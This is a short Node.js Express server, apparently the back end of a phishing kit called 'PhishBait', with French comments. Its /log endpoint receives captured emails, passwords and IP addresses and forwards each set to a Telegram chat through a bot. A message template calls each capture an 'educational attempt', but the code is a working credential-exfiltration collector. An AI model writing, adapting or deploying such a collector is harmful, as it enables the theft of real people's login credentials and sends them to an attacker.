require('dotenv').config();
const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const app = express();
const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN);

app.use(express.json());

// Endpoint pour recevoir les logs
app.post('/log', (req, res) => {
  console.log('Identifiants capturés:', req.body);
  
  // Envoi à Telegram
  bot.sendMessage(
    process.env.TELEGRAM_CHAT_ID,
    `⚠️ Nouvelle tentative éducative:\n\n` +
    `📧 Email: ${req.body.email || 'N/A'}\n` +
    `🔑 Mot de passe: ${req.body.password || 'N/A'}\n` +
    `🌐 IP: ${req.body.ip}\n` +
    `⏰ Date: ${new Date(req.body.timestamp).toLocaleString()}`
  );

  res.status(200).send('OK');
});

const PORT = 3001;
app.listen(PORT, () => {
  console.log(`Serveur PhishBait en écoute sur http://localhost:${PORT}`);
});
